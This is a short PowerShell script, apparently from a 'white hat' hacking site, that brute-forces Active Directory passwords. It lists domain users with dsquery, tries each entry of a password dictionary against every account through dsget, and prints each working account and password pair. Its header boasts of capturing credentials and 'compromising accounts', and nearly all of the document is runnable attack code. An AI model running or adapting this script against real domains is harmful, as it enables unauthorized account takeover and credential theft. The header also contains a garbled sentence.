<#
.Synopsis

	Brute Force Attack Domain Users with PowerShell

.DESCRIPTION

In this script we depart from our to weaponize an information disclosure that is a part of virtually every Microsoft Windows domain that you'll encounter.
Using a few easy tools, we'll extract the usernames and then use an easy technique to capture valid username/password credentials, compromising accounts!

.EXAMPLE

	.\Hack_ADUser_using_BruteForce.ps1

.NOTES

	AUTHORS
	Whitehathacker.info
#>

import-module activedirectory

dsquery user OU=Users,OU=LAB,DC=whitehat,DC=int -limit 0 > users
foreach ($FDN in Get-Content .\users)
{
	$results = dsget user $FDN -samid
	$samid = $results[1].replace(" ", "")
	Write-Host $samid
	foreach ($password in Get-Content .\password-crack-dictionary.txt)
	{
		
		$password = $password.replace(" ", "")
		dsget user $FDN -u $samid -p $password > $null
		if ($?) {
			Write-Host "Account: $samid Password: $password"
			  
			   }

		   }

	}
